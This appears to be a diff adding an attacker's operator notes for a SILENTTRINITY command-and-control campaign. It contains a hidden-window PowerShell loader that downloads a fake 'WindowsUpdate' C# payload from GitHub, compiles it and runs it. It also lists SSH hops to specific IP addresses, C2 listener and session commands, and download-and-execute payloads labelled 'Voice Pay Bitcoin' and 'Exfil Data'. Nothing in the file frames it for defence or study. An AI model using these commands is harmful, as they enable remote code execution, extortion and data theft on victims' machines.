@@ -1,0 +1,32 @@
+Payload
+powershell -NoP -NonI -w h -Exec Bypass -c "& { (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/CYBER4CE/ST/master/WindowsUpdate.txt', 'WindowsUpdate.txt'); $code = [IO.File]::ReadAllText('.\WindowsUpdate.txt'); Add-Type -TypeDefinition $code -Language CSharp; iex '[WindowsUpdate.Program]::Main()' }"
+
+SSH 40.124.3.163
+cd /var/www/html/uploads
+watch ls
+
+
+SSH 40.113.195.121
+cd /opt/SILENTTRINITY/Server
+python3.7 st.py
+
+SILENTTRINITY
+-------------
+listeners
+use http
+start
+
+sessions - get session id
+modules
+use ipy/shell
+
+#RickRoll
+set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/r.txt; Invoke-Expression $($script).content); $script -eq $null; }""'
+
+#Voice Pay Bitcoin
+set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/v.txt; Invoke-Expression $($script).content); $script -eq $null; }""'
+
+#Exfil Data
+set Command 'powershell -c ""& { $script = Invoke-WebRequest https://raw.githubusercontent.com/CYBER4CE/ST/master/e.txt; Invoke-Expression $($script).content); $script -eq $null; }""'
+
+
